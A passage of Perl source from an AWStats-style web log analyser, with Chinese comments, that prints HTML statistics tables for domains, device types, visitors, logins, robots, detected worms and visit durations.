			print "<div style=\"background-color: #$color_k; width: ${bredde_k}px; height: 5px; border-radius: 3px;\" title=\"" . _t("Bandwidth") . ": " . Format_Bytes( $_domener_k{$key} ) . "\"></div>";
		}
		print "</td>\n";
		print "</tr>\n";

		$total_u += $_domener_u;
		$total_v += $_domener_v;
		$total_p += $_domener_p{$key};
		$total_h += $_domener_h{$key};
		$total_k += $_domener_k{$key} || 0;
		$count++;
	}
	my $rest_u = $TotalUnique - $total_u;
	my $rest_v = $TotalVisits - $total_v;
	my $rest_p = $TotalPages - $total_p;
	my $rest_h = $TotalHits - $total_h;
	my $rest_k = $TotalBytes - $total_k;
	if (($rest_u > 0 || $rest_v > 0 || $rest_p > 0 || $rest_h > 0 || $rest_k > 0) && $count >= 10 )
 	# All other domains (known or not)
	{   
		print "<tr><td width=\"$WIDTHCOLICON\">&nbsp;</td>\n<td colspan=\"2\" class=\"aws\"><span style=\"color: #$color_other\">" . _t("Limited list of countries and regions") . "</span></td>\n";
		if ( $ShowDomainsStats =~ /U/i ) { print "<td>$rest_u</td>\n"; }
		if ( $ShowDomainsStats =~ /V/i ) { print "<td>$rest_v</td>\n"; }
		if ( $ShowDomainsStats =~ /P/i ) { print "<td>$rest_p</td>\n"; }
		if ( $ShowDomainsStats =~ /H/i ) { print "<td>$rest_h</td>\n"; }
		if ( $ShowDomainsStats =~ /B/i ) {
			print "<td>" . Format_Bytes($rest_k) . "</td>\n";
		}
		print "<td class=\"aws\">&nbsp;</td>\n";
		print "</tr>\n";
	}
	&tab_end();
}
#------------------------------------------------------------------------------
# 获取设备类型的显示名称（支持多语言）
# Parameters: $device_type (mobile, tablet, tv, wearable, bot, desktop)
# Return: 翻译后的显示名称
#------------------------------------------------------------------------------
sub get_device_display_name {
	my $device_type = shift;
	my %device_names = (
		'mobile'   => _t("Mobile"),
		'tablet'   => _t("Tablet"),
		'tv'       => _t("TV"),
		'wearable' => _t("Wearable"),
		'bot'      => _t("Bot"),
		'desktop'  => _t("Desktop"),
	);
	return $device_names{$device_type} || $device_type;
}

#------------------------------------------------------------------------------
# 获取设备类型的图标文件名
# Parameters: $device_type (mobile, tablet, tv, wearable, bot, desktop)
# Return: 图标文件名（不含扩展名）
#------------------------------------------------------------------------------
sub get_device_emoji {
	my $device_type = shift;
	my %device_emoji = (
		'mobile'   => '📱',
		'tablet'   => '📔',
		'tv'       => '📺',
		'wearable' => '⌚',
		'bot'      => '🕷️',
		'desktop'  => '💻',
	);
	return $device_emoji{$device_type} || '📱';
}

#------------------------------------------------------------------------------
# 检查并处理设备类型键名，返回显示名称和图标名
# Parameters: $key (可能是 _device_xxx 格式的键名)
# Return: ($is_device, $display_name, $icon_name)
#------------------------------------------------------------------------------
sub parse_device_key {
	my $key = shift;
	if ($key =~ /^_device_(\w+)/) {
		my $device_type = $1;
		return (1, get_device_display_name($device_type), get_device_emoji($device_type));
	}
	return (0, $key, '');
}
#------------------------------------------------------------------------------
# 显示设备类型统计（新增）
#------------------------------------------------------------------------------
sub HTMLMainDeviceTypes {
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	print "$Center<a name=\"devices\">&nbsp;</a><br>";
	
	my $title = "📱 " . _t("Device Types");
	&tab_head( "$title", 19, 0, 'devices' );
	
	# 统计设备类型
	my %device_stats = (
		'mobile'   => $_device_h{'mobile'}   || 0,
		'tablet'   => $_device_h{'tablet'}   || 0,
		'tv'       => $_device_h{'tv'}       || 0,
		'wearable' => $_device_h{'wearable'} || 0,
		'bot'      => $_device_h{'bot'}      || 0,
	);
	
	my $total = $TotalHits;
	my $desktop = $total - ($device_stats{mobile} + $device_stats{tablet} + 
							$device_stats{tv} + $device_stats{wearable} + $device_stats{bot});
	$device_stats{desktop} = $desktop if $desktop > 0;
	
	my $max_h = 1;
	foreach (values %device_stats) {
		if ($_ > $max_h) { $max_h = $_; }
	}
	# 表头
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<th colspan=\"2\">" . _t("Device Type") . "</th>\n";
	print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Hits") . "</th>\n";
	print "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>\n";
	print "<th>&nbsp;</th>\n";
	print "</tr>\n";
	
	my %icons = ( mobile=>'📱', tablet=>'📔', tv=>'📺', wearable=>'⌚', bot=>'🕷️', desktop=>'💻' );
	my %names = ( mobile=>_t("Mobile"), tablet=>_t("Tablet"), tv=>_t("TV"), 
				  wearable=>_t("Wearable"), bot=>_t("Bot"), desktop=>_t("Desktop") );
	
	foreach my $type (qw(mobile tablet tv wearable bot desktop)) {
		my $hits = $device_stats{$type} || 0;
		my $pct = $total ? sprintf("%.1f", $hits * 100 / $total) : 0;
		
		my $bredde_h = 0;
		if ($max_h > 0) {
			$bredde_h = int($BarWidth * $hits / $max_h) + 1;
		}
		if ($hits && $bredde_h == 1) { $bredde_h = 2; }
		
		print "<tr>";
		print "<td class=\"aws\"><span style=\"font-size:24px;\">$icons{$type}</span></td>\n";
		print "<td class=\"aws\">$names{$type}</td>\n";
		print "<td class=\"aws\">" . Format_Number($hits) . "</td>\n";
		print "<td class=\"aws\">$pct%</td>\n";
		print "<td class=\"aws\"><div style=\"background-color: #$color_h; width: ${bredde_h}px; height: 5px; border-radius: 3px;\" title=\"" . _t("Hits") . ": " . Format_Number($hits) . "\"></div></td>\n";
		print "</tr>\n";
	}
	
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     HTMLMainHosts - 显示主页面访问者统计图表
# Description:  在主页面上生成访问者（IP/主机名）的统计图表，包含前N条数据、饼图和链接
# Parameters:   $NewLinkParams - URL参数
#               $NewLinkTarget - 链接目标窗口
# Input:        %_host_h, %_host_p, %_host_k, %_host_l, $MaxNbOf{'HostsShown'}
# Output:       HTML格式的访问者统计表格和图表
# Return:       无
# Notes:        显示在主页面的"Who"部分，包含完整列表、最后访问、未解析IP三个链接
#------------------------------------------------------------------------------
sub HTMLMainHosts{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowHostsStats", 2 ); }
	print "$Center<a name=\"visitors\">&nbsp;</a><br>";
	my $title = "📥 " . _t("Visitors") . " (" . _t("Top") 
	  . " $MaxNbOf{'HostsShown'}) &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=allhosts")
		: "$StaticLinks.allhosts.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a> &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=lasthosts")
		: "$StaticLinks.lasthosts.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Last") . "</a> &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=unknownip")
		: "$StaticLinks.unknownip.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Unresolved IP Address") . "</a>";
	  
	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
	   # extend the title to include the added link
		   $title = "$title &nbsp; - &nbsp; <a href=\"" 
		   . (XMLEncode( "$AddLinkToExternalCGIWrapper" 
		   . "?section=VISITOR&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	}
	&tab_head( "$title", 19, 0, 'visitors' );
	&BuildKeyList( $MaxNbOf{'HostsShown'}, $MinHit{'Host'}, \%_host_h, \%_host_p );
	# Graph the top five in a pie chart
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my @valcolor = ($color_p);

			my $cnt = 0;
			my $suma = 0;
			foreach my $key (@keylist) {
			   $suma=$suma + ( $_host_h{$key});
			   $cnt++;
			   if ($cnt > 4) { last; }
			}
			
			$cnt = 0;
			foreach my $key (@keylist) {
			   push @valdata, int( $_host_h{$key} / $suma * 1000 ) / 10;
			   push @blocklabel, "$key";
			   $cnt++;
			   if ($cnt > 4) { last; }
			}
			
			print "<tr><td colspan=\"7\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				"Hosts", "hosts",
				0, \@blocklabel,
				0, \@valcolor,
				0, 0,
				0, \@valdata
			);
			print "</td></tr>\n";
		}
	}
	
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<th width=\"200\">";
	if ( $MonthRequired ne 'all' ) {
		print _t("Visitors") . " : " 
			. Format_Number($TotalHostsKnown) . " " . _t("Known") . ", "
			. Format_Number($TotalHostsUnknown) . " " . _t("Unknown Visitor (Title)") . "<br>"
			. Format_Number($TotalUnique) . " " . _t("Unique visitors")
			. "</th>\n";
	}
	else {
		print _t("Visitors") . " : " . ( scalar keys %_host_h ) . "</th>\n";
	}
	&HTMLShowHostInfo('__title__');
	if ( $ShowHostsStats =~ /P/i ) {
		print "<th bgcolor=\"#$color_p\" width=\"80\""
		  . Tooltip(3)
		  . ">" . _t("Pages") . "</th>\n";
	}
	if ( $ShowHostsStats =~ /H/i ) {
		print "<th bgcolor=\"#$color_h\" width=\"80\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</th>\n";
	}
	if ( $ShowHostsStats =~ /B/i ) {
		print "<th bgcolor=\"#$color_k\" width=\"80\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</th>\n";
	}
	if ( $ShowHostsStats =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>\n";
	}
	print "</tr>\n";
	my $total_p = my $total_h = my $total_k = 0;
	my $count = 0;
	
	my $regipv4 = qr/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/;	

		if ( $DynamicDNSLookup == 2 ) {
			# Use static DNS file
				&Read_DNS_Cache( \%MyDNSTable, "$DNSStaticCacheFile", "", 1 );
		}

	foreach my $key (@keylist) {
		print "<tr>";
		print "<td class=\"aws\" width=\"200\">$key"; 

		if ($DynamicDNSLookup) {
					# Dynamic reverse DNS lookup
					if ($key =~ /$regipv4/o) {
						my $lookupresult=lc(gethostbyaddr(pack("C4",split(/\./,$key)),AF_INET));	# This may be slow
							if (! $lookupresult || $lookupresult =~ /$regipv4/o || ! IsAscii($lookupresult)) {
										if ( $DynamicDNSLookup == 2 ) {
												# Check static DNS file
												$lookupresult = $MyDNSTable{$key};
												if ($lookupresult) { print " ($lookupresult)"; }
												else { print ""; }
										}
										else { print ""; }
								}
								else { print " ($lookupresult)"; }
						}
				}

		print "</td>";
		&HTMLShowHostInfo($key);
		if ( $ShowHostsStats =~ /P/i ) {
			print '<td>' . ( Format_Number($_host_p{$key}) || "&nbsp;" ) . '</td>';
		}
		if ( $ShowHostsStats =~ /H/i ) {
			print "<td>".Format_Number($_host_h{$key})."</td>";
		}
		if ( $ShowHostsStats =~ /B/i ) {
			print '<td>' . Format_Bytes( $_host_k{$key} ) . '</td>';
		}
		if ( $ShowHostsStats =~ /L/i ) {
			print '<td nowrap="nowrap">'
			  . (
				$_host_l{$key}
				? Format_Date( $_host_l{$key}, 1 )
				: '-'
			  )
			  . '</td>';
		}
		print "</tr>\n";
		$total_p += $_host_p{$key};
		$total_h += $_host_h{$key};
		$total_k += $_host_k{$key} || 0;
		$count++;
	}
	my $rest_p = $TotalPages - $total_p;
	my $rest_h = $TotalHits - $total_h;
	my $rest_k = $TotalBytes - $total_k;
	# All other visitors (known or not)
	if ( ($rest_p > 0 || $rest_h > 0 || $rest_k > 0) && $count >= 10 ) {
		print "<tr>";
		print "<td class=\"aws\"><span style=\"color: #$color_other\">" . _t("currentVisitorData") . "</span></td>";
		&HTMLShowHostInfo('');
		if ( $ShowHostsStats =~ /P/i ) { print "<td>".Format_Number($rest_p)."</td>"; }
		if ( $ShowHostsStats =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>"; }
		if ( $ShowHostsStats =~ /B/i ) { print "<td>". Format_Bytes($rest_k)."</td>"; }
		if ( $ShowHostsStats =~ /L/i ) { print "<td>&nbsp;</td>"; }
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the logins chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainLogins{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowAuthenticatedUsers", 2 ); }
	print "$Center<a name=\"logins\">&nbsp;</a>";
	my $title = _t("Login") . " (" . _t("Top") 
	  . " $MaxNbOf{'LoginShown'}) &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=alllogins")
		: "$StaticLinks.alllogins.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
	if ( $ShowAuthenticatedUsers =~ /L/i ) {
		$title .= " &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=lastlogins")
			: "$StaticLinks.lastlogins.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Last") . "</a>";
	}
	&tab_head( "$title", 19, 0, 'logins' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("Login") . " : "
	  . Format_Number(( scalar keys %_login_h )) . "</th>\n";
	&HTMLShowUserInfo('__title__');
	if ( $ShowAuthenticatedUsers =~ /P/i ) {
		print "<th bgcolor=\"#$color_p\" width=\"80\""
		  . Tooltip(3)
		  . ">" . _t("Pages") . "</th>\n";
	}
	if ( $ShowAuthenticatedUsers =~ /H/i ) {
		print "<th bgcolor=\"#$color_h\" width=\"80\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</th>\n";
	}
	if ( $ShowAuthenticatedUsers =~ /B/i ) {
		print "<th bgcolor=\"#$color_k\" width=\"80\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</th>\n";
	}
	if ( $ShowAuthenticatedUsers =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>\n";
	}
	print "</tr>\n";
	my $total_p = my $total_h = my $total_k = 0;
	my $max_h = 1;
	foreach ( values %_login_h ) {
		if ( $_ > $max_h ) { $max_h = $_; }
	}
	my $max_k = 1;
	foreach ( values %_login_k ) {
		if ( $_ > $max_k ) { $max_k = $_; }
	}
	my $count = 0;
	&BuildKeyList( $MaxNbOf{'LoginShown'}, $MinHit{'Login'}, \%_login_h, \%_login_p );
	foreach my $key (@keylist) {
		my $bredde_p = 0;
		my $bredde_h = 0;
		my $bredde_k = 0;
		if ( $max_h > 0 ) {
			$bredde_p = int( $BarWidth * $_login_p{$key} / $max_h ) + 1;
		}    # use max_h to enable to compare pages with hits
		if ( $max_h > 0 ) {
			$bredde_h = int( $BarWidth * $_login_h{$key} / $max_h ) + 1;
		}
		if ( $max_k > 0 ) {
			$bredde_k = int( $BarWidth * $_login_k{$key} / $max_k ) + 1;
		}
		print "<tr><td class=\"aws\">$key</td>\n";
		&HTMLShowUserInfo($key);
		if ( $ShowAuthenticatedUsers =~ /P/i ) {
			print "<td>"
			  . ( $_login_p{$key} ? Format_Number($_login_p{$key}) : "&nbsp;" )
			  . "</td>\n";
		}
		if ( $ShowAuthenticatedUsers =~ /H/i ) {
			print "<td>".Format_Number($_login_h{$key})."</td>\n";
		}
		if ( $ShowAuthenticatedUsers =~ /B/i ) {
			print "<td>" . Format_Bytes( $_login_k{$key} ) . "</td>\n";
		}
		if ( $ShowAuthenticatedUsers =~ /L/i ) {
			print "<td>"
			  . (
				$_login_l{$key}
				? Format_Date( $_login_l{$key}, 1 )
				: '-'
			  )
			  . "</td>\n";
		}
		print "</tr>\n";
		$total_p += $_login_p{$key};
		$total_h += $_login_h{$key};
		$total_k += $_login_k{$key};
		$count++;
	}
	my $rest_p = $TotalPages - $total_p;
	my $rest_h = $TotalHits - $total_h;
	my $rest_k = $TotalBytes - $total_k;
	# All other logins
	if ( ($rest_p > 0 || $rest_h > 0 || $rest_k > 0) && $count >= 10 ) {  
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">"
		  . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
		  . _t("Anonymous")
		  . ( $PageDir eq 'rtl' ? "</span>" : "" )
		  . "</span></td>\n";
		&HTMLShowUserInfo('');
		if ( $ShowAuthenticatedUsers =~ /P/i ) { print "<td>" . ( $rest_p ? Format_Number($rest_p) : "&nbsp;" ) . "</td>\n"; }
		if ( $ShowAuthenticatedUsers =~ /H/i ) { print "<td>".Format_Number($rest_h)."</td>\n"; }
		if ( $ShowAuthenticatedUsers =~ /B/i ) { print "<td>" . Format_Bytes($rest_k) . "</td>\n"; }
		if ( $ShowAuthenticatedUsers =~ /L/i ) { print "<td>&nbsp;</td>\n"; }
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the robots chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainRobots{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowRobotStats", 2 ); }
	print "$Center<a name=\"robots\">&nbsp;</a>";

	my $title = "🕷️ " . _t("Robots") . " (" . _t("Top") 
		  . " $MaxNbOf{'RobotShown'}) &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=allrobots")
			: "$StaticLinks.allrobots.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Full list") . "</a> &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=lastrobots")
			: "$StaticLinks.lastrobots.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Last") . "</a>";

	if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
	   # extend the title to include the added link
		   $title = "$title &nbsp; - &nbsp; <a href=\"" 
		   . (XMLEncode( "$AddLinkToExternalCGIWrapper" 
		   . "?section=ROBOT&baseName=$DirData/$PROG"
		   . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
		   . "&siteConfig=$SiteConfig" )
		   . "\"$NewLinkTarget>" . _t("Export") . "</a>");
	}
		
	&tab_head( "$title", 19, 0, 'robots');
		
	print "<tr bgcolor=\"#$color_TableBGRowTitle\""
	  . Tooltip(16) . "><th>"
	  . Format_Number(( scalar keys %_robot_h ))
	  . " " . _t("Different robots") . "*</th>\n";
	if ( $ShowRobotsStats =~ /H/i ) {
		print "<th bgcolor=\"#$color_h\" width=\"30\">" . _t("Hits") . "</th>\n";
	}
	if ( $ShowRobotsStats =~ /B/i ) {
		print "<th bgcolor=\"#$color_k\" width=\"30\">" . _t("Bandwidth") . "</th>\n";
	}
	if ( $ShowRobotsStats =~ /L/i ) {
		print "<th width=\"30\">" . _t("Last") . "</th>\n";
	}
	print "</tr>\n";
	
	my $total_p = my $total_h = my $total_k = my $total_r = 0;
	my $count = 0;
	&BuildKeyList( $MaxNbOf{'RobotShown'}, $MinHit{'Robot'}, \%_robot_h, \%_robot_h );
	foreach my $key (@keylist) {
		print "<tr><td class=\"aws\">"
		  . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
		  . ( $RobotsHashIDLib{$key} ? $RobotsHashIDLib{$key} : $key )
		  . ( $PageDir eq 'rtl' ? "</span>" : "" ) . "</td>\n";
		
		if ( $ShowRobotsStats =~ /H/i ) {
			my $normal_hits = $_robot_h{$key} - $_robot_r{$key};
			my $robot_txt_hits = $_robot_r{$key} || 0;
			
			# 生成鼠标悬停提示文本
			my $tooltip_text = "";
			if ($robot_txt_hits > 0) {
				if ($normal_hits > 0) {
					$tooltip_text = sprintf(
						_t("robot_hits_detail_both"),
						Format_Number($normal_hits + $robot_txt_hits),
						Format_Number($normal_hits),
						Format_Number($robot_txt_hits)
					);
				} else {
					$tooltip_text = sprintf(
						_t("robot_hits_detail_only_robots"),
						Format_Number($robot_txt_hits)
					);
				}
			} else {
				$tooltip_text = sprintf(
					_t("robot_hits_detail_normal"),
					Format_Number($normal_hits)
				);
			}
			
			# 转义 HTML 特殊字符
			$tooltip_text =~ s/&/&amp;/g;
			$tooltip_text =~ s/</&lt;/g;
			$tooltip_text =~ s/>/&gt;/g;
			$tooltip_text =~ s/"/&quot;/g;
			
			print "<td>"
			  . "<span title=\"$tooltip_text\">"
			  . Format_Number($normal_hits)
			  . ( $robot_txt_hits ? "+$robot_txt_hits" : "" )
			  . "</span>"
			  . "</td>\n";
		}
		
		if ( $ShowRobotsStats =~ /B/i ) {
			print "<td>" . Format_Bytes( $_robot_k{$key} ) . "</td>\n";
		}
		if ( $ShowRobotsStats =~ /L/i ) {
			print "<td>"
			  . (
				$_robot_l{$key}
				? Format_Date( $_robot_l{$key}, 1 )
				: '-'
			  )
			  . "</td>\n";
		}
		print "</tr>\n";

		$total_h += $_robot_h{$key};
		$total_k += $_robot_k{$key} || 0;
		$total_r += $_robot_r{$key} || 0;
		$count++;
	}

	# For bots we need to count Totals
	my $TotalHitsRobots = 0;
	foreach ( values %_robot_h ) { $TotalHitsRobots += $_; }
	my $TotalBytesRobots = 0;
	foreach ( values %_robot_k ) { $TotalBytesRobots += $_; }
	my $TotalRRobots = 0;
	foreach ( values %_robot_r ) { $TotalRRobots += $_; }
	
	my $rest_h = $TotalHitsRobots - $total_h;
	my $rest_k = $TotalBytesRobots - $total_k;
	my $rest_r = $TotalRRobots - $total_r;

	if ( $rest_h > 0 || $rest_k > 0 || $rest_r > 0 ) {
		print "<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Only first 10 robots shown") . "</span></td>\n";
		
		if ( $ShowRobotsStats =~ /H/i ) {
			my $normal_rest = $rest_h - $rest_r;
			my $tooltip_text = "";
			
			if ($normal_rest > 0 && $rest_r > 0) {
				$tooltip_text = sprintf(
					_t("robot_hits_detail_both"),
					Format_Number($rest_h),
					Format_Number($normal_rest),
					Format_Number($rest_r)
				);
			} elsif ($rest_r > 0) {
				$tooltip_text = sprintf(
					_t("robot_hits_detail_only_robots"),
					Format_Number($rest_r)
				);
			} else {
				$tooltip_text = sprintf(
					_t("robot_hits_detail_normal"),
					Format_Number($normal_rest)
				);
			}
			
			$tooltip_text =~ s/&/&amp;/g;
			$tooltip_text =~ s/</&lt;/g;
			$tooltip_text =~ s/>/&gt;/g;
			$tooltip_text =~ s/"/&quot;/g;
			
			print "<td>"
			  . "<span title=\"$tooltip_text\">"
			  . Format_Number($normal_rest)
			  . ( $rest_r ? "+$rest_r" : "" )
			  . "</span>"
			  . "</td>\n";
		}
		
		if ( $ShowRobotsStats =~ /B/i ) {
			print "<td>" . ( Format_Bytes($rest_k) ) . "</td>\n";
		}
		if ( $ShowRobotsStats =~ /L/i ) { print "<td>&nbsp;</td>\n"; }
		print "</tr>\n";
	}
	
	&tab_end(
		"* " . _t("Hits on robots.txt") . ( $TotalRRobots ? " " . _t("Total") : "" ) );
}

#------------------------------------------------------------------------------
# Function:     Prints the worms chart and table
# Parameters:   -
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainWorms{
	if ($Debug) { debug( "ShowWormsStats", 2 ); }
	print "$Center<a name=\"worms\">&nbsp;</a>";
	&tab_head( _t("Worms") . " (" . _t("Top") . " $MaxNbOf{'WormsShown'})", 19, 0, 'worms' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"" . Tooltip(21) . ">";
	print "<th>" . Format_Number(( scalar keys %_worm_h )) . " " . _t("Different worms") . "*</th>\n";
	print "<th>" . _t("Target") . "</th>\n";
	if ( $ShowWormsStats =~ /H/i ) { print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>\n"; }
	if ( $ShowWormsStats =~ /B/i ) { print "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>\n"; }
	if ( $ShowWormsStats =~ /L/i ) { print "<th width=\"120\">" . _t("Last") . "</th>\n"; }
	print "</tr>\n";
	my $total_p = my $total_h = my $total_k = 0;
	my $count = 0;
	&BuildKeyList( $MaxNbOf{'WormsShown'}, $MinHit{'Worm'}, \%_worm_h,
		\%_worm_h );
	foreach my $key (@keylist) {
		print "<tr>";
		print "<td class=\"aws\">"
		  . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
		  . ( $WormsHashLib{$key} ? $WormsHashLib{$key} : $key )
		  . ( $PageDir eq 'rtl' ? "</span>" : "" ) . "</td>\n";
		print "<td class=\"aws\">"
		  . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
		  . ( $WormsHashTarget{$key} ? $WormsHashTarget{$key} : $key )
		  . ( $PageDir eq 'rtl' ? "</span>" : "" ) . "</td>\n";
		if ( $ShowWormsStats =~ /H/i ) { print "<td>" . Format_Number($_worm_h{$key}) . "</td>\n"; }
		if ( $ShowWormsStats =~ /B/i ) { print "<td>" . Format_Bytes( $_worm_k{$key} ) . "</td>\n"; }
		if ( $ShowWormsStats =~ /L/i ) { print "<td>" . ( $_worm_l{$key} ? Format_Date( $_worm_l{$key}, 1 ) : '-' ) . "</td>\n"; }
		print "</tr>\n";

		#$total_p += $_worm_p{$key};
		$total_h += $_worm_h{$key};
		$total_k += $_worm_k{$key} || 0;
		$count++;
	}

	# For worms we need to count Totals
	my $TotalPagesWorms =
	  0;    #foreach (values %_worm_p) { $TotalPagesWorms+=$_; }
	my $TotalHitsWorms = 0;
	foreach ( values %_worm_h ) { $TotalHitsWorms += $_; }
	my $TotalBytesWorms = 0;
	foreach ( values %_worm_k ) { $TotalBytesWorms += $_; }
	my $rest_p = 0;    
	# $rest_p=$TotalPagesRobots-$total_p;
	my $rest_h = $TotalHitsWorms - $total_h;
	my $rest_k = $TotalBytesWorms - $total_k;
	# All other worms
	if ( ($rest_p > 0 || $rest_h > 0 || $rest_k > 0) && $count >= 10 ) { 
		print "<tr>";
		print "<td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others (worms)") . "</span></td>\n";
		print "<td class=\"aws\">-</td>\n";
		if ( $ShowWormsStats =~ /H/i ) { print "<td>" . Format_Number(($rest_h)) . "</td>\n"; }
		if ( $ShowWormsStats =~ /B/i ) { print "<td>" . ( Format_Bytes($rest_k) ) . "</td>\n"; }
		if ( $ShowWormsStats =~ /L/i ) { print "<td>&nbsp;</td>\n"; }
		print "</tr>\n";
	}
	&tab_end("* " . _t("Different worms"));
}

#------------------------------------------------------------------------------
# Function:     HTMLMainSessions - 显示会话时长统计图表
# Description:  在主页面上生成访问会话时长的分布统计，包含各时间段的数量和百分比
# Parameters:   无
# Input:        %_session - 各时间段会话数
#               $TotalVisits - 总访问次数
# Output:       HTML格式的会话时长统计表格
# Return:       无
#------------------------------------------------------------------------------
sub HTMLMainSessions{
	if ($Debug) { debug( "ShowSessionsStats", 2 ); }
	print "$Center<a name=\"sessions\">&nbsp;</a>";
	my $title = "⏱️ " . _t("Visits duration");
	&tab_head( $title, 19, 0, 'sessions' );
	
	my @session_order = (
		'0s-30s', '30s-1min', '1min-2min', '2min-3min', '3min-5min',
		'5min-10min', '10min-15min', '15min-30min', '30min-45min',
		'45min-1h', '1h-1.5h', '1.5h-2h', '2h-3h', '3h-4h', '4h-5h',
		'5h-6h', '6h-8h', '8h-10h', '10h-12h', '12h-18h', '18h-24h', '24h+'
	);
	
	my @session_keys = grep { exists $_session{$_} } @session_order;
	
	if (!@session_keys) {
		print "<tr><td colspan=\"3\" align=\"center\">" . _t("No session data available") . "</td>\n</tr>\n";
		&tab_end();
		return;
	}
	
	# 辅助函数：转换单个时长值
	sub _fmt_duration {
		my $v = shift;
		if ($v =~ /^(\d+)s$/)     { return $1 . _t("unit_s"); }
		if ($v =~ /^(\d+)min$/)   { return $1 . _t("unit_min"); }
		if ($v =~ /^(\d+)h$/)     { return $1 . _t("unit_h"); }
		if ($v =~ /^(\d+)\.(\d+)h$/) { return $1 . "." . $2 . _t("unit_h"); }
		return $v;
	}
	
	# 动态生成显示文本
	my @session_display = map {
		my ($start, $end) = split(/-/, $_);
		my $start_fmt = _fmt_duration($start);
		my $end_fmt = _fmt_duration($end);
		sprintf(_t("duration_format"), $start_fmt, $end_fmt);
	} @session_keys;
	
	# 定义各时长的平均值
	my %session_avg = (
		'0s-30s'     => 15,
		'30s-1min'   => 45,
		'1min-2min'  => 90,
		'2min-3min'  => 150,
		'3min-5min'  => 240,
		'5min-10min' => 450,
		'10min-15min'=> 750,
		'15min-30min'=> 1350,
		'30min-45min'=> 2250,
		'45min-1h'   => 3150,
		'1h-1.5h'    => 4500,
		'1.5h-2h'    => 6300,
		'2h-3h'      => 9000,
		'3h-4h'      => 12600,
		'4h-5h'      => 16200,
		'5h-6h'      => 19800,
		'6h-8h'      => 25200,
		'8h-10h'     => 32400,
		'10h-12h'    => 39600,
		'12h-18h'    => 54000,
		'18h-24h'    => 75600,
		'24h+'       => 86400,
	);
	
	my $Totals = 0;
	my $average_s = 0;
	foreach my $key (@session_keys) {
		my $avg = $session_avg{$key} || 3600;
